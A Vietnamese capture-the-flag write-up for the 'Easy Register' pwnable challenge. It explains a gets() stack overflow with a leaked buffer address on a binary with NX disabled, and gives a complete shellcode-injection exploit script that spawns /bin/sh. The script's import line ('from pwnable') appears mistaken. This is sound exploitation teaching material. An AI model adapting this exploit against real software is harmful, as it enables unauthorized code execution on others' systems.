# [Intigrity] Easy Register
<p>Dòng 8, hàm gets đọc chuỗi từ stdin không giới hạn độ dài vào v1 -> Buffer overflow. Dòng 5, in ra địa chỉ của v1 nằm trên stack.</p>

![alt text](/thanhlai/post/pwnable/image/post10/image.png)

<p>Cơ chế NX đang tắt -> Có thể thực thi shellcode trên stack. Lợi dụng việc leak địa chỉ v1 để kiểm soát RIP trỏ tới địa chỉ chứa shellcode.</p>

![alt text](/thanhlai/post/pwnable/image/post10/image-1.png)

<p>Đặt breakpoint ngay hàm printf đầu tiên trong hàm easy_register, ta có thể thấy hàm printf sẽ in ra địa chỉ sẽ ghi vào là 0x00007fffffffe260.</p>

![alt text](/thanhlai/post/pwnable/image/post10/image-2.png)

<p>Nhập chuỗi "laithanh" và đã được ghi chính xác vào địa chỉ 0x00007fffffffe260 -> Đây sẽ là nơi chứa shellcode để thực ghi execve("/bin/sh\0", 0, 0)</p>

![alt text](/thanhlai/post/pwnable/image/post10/image-4.png)

<p>Script exploit:</p>

```
from pwnable import *

p = process('./easy_register')

shellcode = asm(
    '''
    mov rax, 0x3b
    mov rdi, 29400045130965551
    push rdi 
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
    ''', arch = 'amd64'
)

line = p.recvline_contains(b'Initialized attendee listing at').decode()
addr = int(line.split()[-1].strip('.'), 16)
print(f'Leaked: {(hex(addr))}')

payload = shellcode
payload += b"A" * (88 - len(shellcode))  
payload += p64(addr)  

p.sendlineafter(b'Hacker name > ', payload)

p.interactive()
```

<p>Chạy script và lấy được shell.</p>

![alt text](/thanhlai/post/pwnable/image/post10/image-3.png)
